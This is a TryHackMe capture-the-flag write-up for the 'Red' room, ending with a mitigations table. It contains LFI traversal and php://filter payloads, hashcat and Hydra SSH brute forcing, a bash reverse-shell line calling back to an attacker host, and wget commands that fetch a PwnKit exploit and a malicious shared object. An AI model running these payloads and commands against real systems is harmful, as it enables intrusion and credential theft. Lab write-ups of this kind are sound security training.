# Red: TryHackMe Writeup

```
██████╗ ███████╗██████╗
██╔══██╗██╔════╝██╔══██╗
██████╔╝█████╗  ██║  ██║
██╔══██╗██╔══╝  ██║  ██║
██║  ██║███████╗██████╔╝
╚═╝  ╚═╝╚══════╝╚═════╝
   "Red Rules, Blue Drools"
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-25 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Medium | ⭐ **Rating:** ⭐⭐⭐⭐☆

> ⏱️ ~18 min read

---

## 📋 Table of Contents

- [Prerequisites](#prerequisites)
- [Progress Checklist](#progress-checklist)
- [🛠️ Tools Used](#️-tools-used)
- [⚡ TL;DR](#-tldr)
- [📖 Introduction](#-introduction)
- [🔍 Recon](#-recon)
- [🚪 Foothold](#-foothold)
- [🐚 Shell / Access](#-shell--access)
- [💥 Exploitation](#-exploitation)
- [🐇 Rabbit Holes](#-rabbit-holes)
- [🏁 Flag](#-flag)
- [🛡️ Mitigations](#️-mitigations)
- [💡 Key Takeaway](#-key-takeaway)
- [🔁 If I Did It Again](#-if-i-did-it-again)
- [🔚 Changelog](#-changelog)

---

## Prerequisites

Assumed knowledge for this one:

- Basic LFI / path traversal concepts and PHP stream wrappers (`php://filter`)
- Comfort reading PHP source and spotting sanitization logic flaws
- Familiarity with `hashcat`/`john` rule-based wordlist mutation
- Basic Linux privilege escalation enumeration (SUID binaries, `find -perm`)
- General comfort with reverse shells and `netcat`

---

## Progress Checklist

- [x] Recon (nmap, feroxbuster)
- [x] LFI discovery and filter bypass
- [x] Source code disclosure via `php://filter`
- [x] Credential discovery (`.reminder` file)
- [x] Wordlist mutation (hashcat rules)
- [x] SSH brute force to `blue`
- [x] Lateral movement `blue` → `red` (reverse shell)
- [x] Flag 1 and Flag 2 captured
- [ ] Root flag (privesc blocked by GLIBC mismatch: see Rabbit Holes)

---

## 🛠️ Tools Used

- 🔎 Nmap: port scanning and service enumeration
- 🕷️ Feroxbuster: directory brute force (came up mostly empty here)
- 🌀 cURL: manual LFI payload delivery and source code exfiltration
- 🔓 Hashcat: rule-based wordlist mutation from a base password string
- 🐎 Hydra: SSH credential brute forcing
- 🐍 pkexec PwnKit PoC (EDB-50689): local privilege escalation attempt
- 🛰️ Netcat: reverse shell listener

---

## ⚡ TL;DR

An LFI in a "free business template" PHP app leaks its own source code via `php://filter`, exposing a single-pass sanitization flaw that's trivially bypassed. That LFI leads to a leaked password reminder, which gets mutated with hashcat rules into a real password for the user `blue`. From there, an actively hostile `red` user is found editing `/etc/hosts` and killing shells in real time, eventually getting lateral'd into via a reverse shell back-connect. A SUID `pkexec` binary is found but the PwnKit exploit fails due to a GLIBC version mismatch between attacker and target.

---

## 📖 Introduction

*Today's victim is a humble little Apache box hiding behind a free "Atlanta" business template*: the kind of site you'd scroll past without a second glance. But scratch the surface of `index.php?page=` and something interesting happens: the page parameter doesn't just load content, it **reads files**. And buried somewhere on this box are two users locked in what can only be described as a turf war: one of them is about to find out the hard way that "Red Rules" wasn't just a username flex.

---

## 🔍 Recon

*Standard nmap service scan against the target:*

```bash
nmap -sV -sC 10.49.179.19
```

```text
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
| http-methods:
|_  Supported Methods: GET HEAD POST
```

Cleaned up as a table:

| Port | Service | Version |
| --- | --- | --- |
| 22 | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 80 | HTTP | Apache 2.4.41 (Ubuntu) |

The first thing that jumps out is the URL itself: visiting the root IP redirects straight to `index.php?page=home.html`. *A `page=` parameter that loads a `.html` file by name is basically a neon sign reading "try LFI here."*

Feroxbuster was thrown at the site for good measure:

```bash
feroxbuster -u http://10.49.179.19 -w /usr/share/wordlists/dirb/common.txt
```

*Didn't turn up anything worth reporting*: no juicy hidden directories. The real way in was always going to be that `page` parameter.

---

## 🚪 Foothold

### Understanding the vulnerability

Local File Inclusion happens when an application takes user input and feeds it directly into a file-read function (`include`, `readfile`, etc.) without properly validating it. If the app strips dangerous sequences like `../` but only does it **once**, you can often smuggle a traversal sequence past the filter by nesting it: the classic `....//` trick. The filter removes the inner `../`, and what's left collapses back into a working traversal sequence.

*A single line before the payload: this is the core LFI request structure used against the target.*

```text
http://10.49.179.19/index.php?page=php://filter/resource=.....///.....///.....///.....///[TARGET_FILE]
```

This nested `.....///` sequence is the bypass:
- each `str_replace` pass on `../` or `./` only fires once, so wrapping the traversal in extra junk characters leaves a valid `../` behind after stripping

### Pulling the source code

Rather than guessing at the filter logic, the smart move is to make the app hand over its own source. `php://filter/convert.base64-encode/resource=` is a PHP stream wrapper that reads a file and returns it base64-encoded: useful because PHP files would otherwise just execute instead of displaying as text.

*Requesting the app's own index.php through the filter wrapper:*

```bash
curl http://10.49.179.19/index.php?page=php://filter/convert.base64-encode/resource=index.php -o index.php
```

*Decoding the result locally:*

```bash
base64 --decode index.php
```

```php
<?php

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

This explains everything in one shot:

- **The regex gate** (`^[a-z]`) requires the parameter to *start* with a lowercase letter, so an absolute path like `/etc/passwd` is rejected outright, since it starts with `/`
- **The sanitization flaw**: `str_replace` only runs once per pattern, no loop, no recursion: which is exactly why the nested `.....///` sequence survives
- **The stream wrapper advantage**: `php://filter` starts with `p`, satisfying the regex for free, and never contains `../` at all, so it sails through `sanitize_input()` completely untouched

*(~6 mins into the box)*: once the source confirmed the theory, it was just a matter of pointing the same wrapper at more interesting files.

### Reading sensitive files

*Apache's vhost config, read through the same LFI:*

```bash
curl "http://10.49.179.19/index.php?page=php://filter/resource=/etc/apache2/sites-enabled/000-default.conf"
```

This confirmed `DocumentRoot` at `/var/www/html` and standard `${APACHE_LOG_DIR}` log paths: nothing groundbreaking, but useful for orientation. *An attempt to read `/proc/self/environ` for environment variable leakage returned a blank page*: likely blocked by kernel-level restrictions on that particular proc path.

Enumerating `/etc/passwd` turned up two non-system users: `blue` and `red`. *Given the room's name and the .reminder file convention common in these boxes, checking home directories for stray notes felt like the obvious next move.*

*Pulling a hidden reminder file out of blue's home directory:*

```bash
curl "http://10.49.179.19/index.php?page=php://filter/resource=/home/blue/.reminder"
```

```text
sup3r_p@s$w0rd!
```

A bare password string sitting in a dotfile. Almost too easy: except this wasn't the actual SSH password, just the seed for one.

---

## 🐚 Shell / Access

### From base string to real password

The `.reminder` string clearly wasn't going to work as-is over SSH: `bash_history` on the box hinted that the real password had been run through a **best64 rule** mutation, with a strong nudge that the `red` user ("Red rules") was the one applying it.

*Generating a candidate wordlist from the reminder string using hashcat's rule engine:*

```bash
echo 'sup3r_p@s$w0rd!' > .reminder
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best66.rule > passlist.txt
```

- `--stdout`: print the mutated wordlist to stdout instead of trying to crack a hash with it
- `-r`: apply a rule file, which defines mutation operations (case toggles, prepends, appends, character substitutions) to each input word

*This is where things briefly went sideways: see the Rabbit Holes section for the John-vs-Hashcat rule parsing saga that happened first.*

### Brute forcing SSH

*Throwing the mutated wordlist at both discovered users:*

```bash
hydra -l blue -P passlist.txt ssh://10.49.179.19
```

```text
[22][ssh] host: 10.49.179.19   login: blue   password: thesup3r_p@s$w0rd!
1 of 1 target successfully completed, 1 valid password found
# ^^^ this is the important bit
```

| Username | Password | Where found |
| --- | --- | --- |
| blue | `thesup3r_p@s$w0rd!` | Hashcat best64-rule mutation of `/home/blue/.reminder` |

*Logging in as blue:*

```bash
ssh blue@10.49.179.19
```

```text
blue@red:~$ ls
flag1
blue@red:~$ cat flag1
THM{Is_thAt_all_y0u_can_d0_blU3?}
```

First flag down. *(~25 mins into the box)*

### The hostname fight

Things get weird here. The box's prompt reads `blue@red`: *blue is SSHing into a machine whose hostname is literally "red,"* which lines up with the room's whole "Red Rules, Blue Drools" framing. While poking around, taunting messages started appearing directly in the terminal output: someone (presumably `red`, scripted or live) was actively interacting with the same box:

```text
blue@red:~$ Don't be silly Blue, you will never win
```

An attempt to add a hosts entry for a pivot domain (`redrules.thm`) succeeded, and a reverse shell back-connect was attempted from `blue`'s session:

```bash
echo "192.168.134.217 redrules.thm" | tee -a /etc/hosts
bash -c 'nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &'
```

The session got killed almost immediately:

```text
blue@red:~$ Say Bye Bye to your Shell Blue and that password
Get out of my machine Blue!!
Connection to 10.49.179.19 closed by remote host.
```

*This took an embarrassingly stubborn series of reconnects to push past*: the `blue` password even appears to have been rotated mid-session (`!dr0w$s@p_r3pus`, a reversed variant of the original), requiring another Hydra run against the same mutated wordlist to recover access:

```text
[22][ssh] host: 10.49.179.19   login: blue   password: !dr0w$s@p_r3pus
```

A subsequent message left in `/etc/hosts` edits, decoded from base64, turned out to be another taunt rather than a useful credential:

```bash
echo "WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==" | base64 -d
```

```text
You really suck at this Blue
```

### Catching the lateral shell

Despite the interference, the reverse shell attempt from `blue` eventually connected back to a listener:

```bash
nc -nvlp 9001
```

```text
connect to [192.168.134.217] from (UNKNOWN) [10.49.179.19] 51530
red@red:~$ ls
flag2
red@red:~$ cat flag2
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
```

That reverse shell landed as `red`, not `blue`: *most likely the cron job or script running `red`'s side of the taunting also owned the process that picked up the back-connect, or `red`'s account was what actually executed the queued reverse shell command from blue's typed input.* Either way, second flag captured. *(~40 mins into the box)*

---

## 💥 Exploitation

### Hunting for privilege escalation

With a shell as `red`, the standard SUID sweep was run:

*Searching for SUID binaries that might allow privilege escalation:*

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Buried in the (mostly standard) output was something unusual:

```text
418507     32 -rwsr-xr-x   1 root     root        31032 Aug 14  2022 /home/red/.git/pkexec
```

*A SUID copy of `pkexec` sitting inside a hidden `.git` directory in red's own home folder*: not a system path, clearly placed there deliberately as part of the challenge.

```bash
./pkexec --version
```

```text
pkexec version 0.105
```

Pkexec 0.105 is vulnerable to **CVE-2021-4034**, better known as **PwnKit**: a local privilege escalation flaw in Polkit's `pkexec` caused by improper handling of argument count and environment variables, allowing an unprivileged user to escalate to root through a crafted execution context.

### Attempting PwnKit (EDB-50689)

The plan: pull down a PwnKit PoC, patch the hardcoded `pkexec` path to point at the home-directory copy, compile, and run.

```c
#define BIN "/usr/bin/pkexec"
```

changed to:

```c
#define BIN "/home/red/.git/pkexec"
```

*A small local web server on the attacker box served the patched exploit, a helper shared object, and a compiled binary:*

```bash
wget http://192.168.134.217:4443/exploit.c
wget http://192.168.134.217:4443/evil-so.c
wget http://192.168.134.217:4443/exploit
wget http://192.168.134.217:4443/evil.so
chmod +x exploit
./exploit
```

```text
./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
```

*This is the important failure line*: the binary was linked against a GLIBC version the target simply doesn't have.

See the Rabbit Holes section below for the full breakdown of why, and what the correct fix would have been.

---

## 🐇 Rabbit Holes

**John rule syntax fed into Hashcat:** The first attempt at generating the credential wordlist ran John the Ripper's `best64.rule` file directly through Hashcat's `--stdout` engine. Hashcat couldn't fully parse John's native rule syntax and silently dropped most of the rules, producing only 20 mutated words instead of a full expansion. *Recreating a Hashcat-native version of the best64 rule set from scratch fixed this*: the two tools' rule grammars aren't drop-in compatible even though they look similar on the surface.

**PwnKit GLIBC mismatch:** The patched PwnKit exploit was compiled on a Kali Rolling attacker machine running **GLIBC 2.42**, while the target was Ubuntu 20.04 on **GLIBC 2.31**. The compiled binary ended up requiring the symbol `__libc_start_main@GLIBC_2.34`, which doesn't exist on the target's older libc: even though the exploit's actual source code only calls older, widely-available functions like `execve` and `system`. The incompatibility came entirely from the build environment, not the exploit logic itself. *The correct fix would have been compiling in a container or VM matching Ubuntu 20.04 / GLIBC 2.31, or compiling directly on the target*, but no compiler (`gcc`) was available on the box, and write access to install one via `apt` was blocked by missing dpkg lock permissions. This was documented rather than chased further given time constraints.

**Two minor compile fixes** were also needed along the way for the supporting `evil-so.c` and `exploit.c` files: missing `#include <grp.h>` and `#include <unistd.h>` respectively: *likely due to stricter default header inclusion behavior on newer glibc/gcc toolchains than whatever the original PoC was written against.*

---

## 🏁 Flag

| Flag | Value |
| --- | --- |
| Flag 1 (blue) | `THM{Is_thAt_all_y0u_can_d0_blU3?}` |
| Flag 2 (red) | `THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}` |

*Root was not obtained in this run* due to the GLIBC compatibility issue documented above.

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| LFI via `page` parameter | High | Use a strict allowlist of permitted filenames instead of blocklist-based sanitization; never pass user input directly into `readfile()` |
| Single-pass `str_replace` sanitization | High | Apply sanitization in a loop until no more matches are found, or better, reject any input containing path separators entirely |
| Credentials stored in plaintext dotfiles | Medium | Never store passwords or password seeds in user-readable home directory files, even "hidden" ones |
| SUID `pkexec` binary in non-standard location | Critical | Audit the filesystem regularly for unexpected SUID binaries; patch Polkit to a version beyond CVE-2021-4034 |
| Weak/predictable SSH password policy | Medium | Enforce strong, randomly generated credentials and consider disabling password auth in favor of key-based SSH |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** A sanitization function that only runs once is functionally the same as no sanitization at all: always test traversal filters by nesting the very sequence they claim to strip.

---

## 🔁 If I Did It Again

I'd spin up a matching Ubuntu 20.04 / GLIBC 2.31 container locally before touching the PwnKit exploit, instead of compiling on Kali Rolling and discovering the version mismatch after the fact.

---

## 🔚 Changelog

*Last updated: 2026-06-25*

---

[↑ Back to top](#red--tryhackme-writeup)
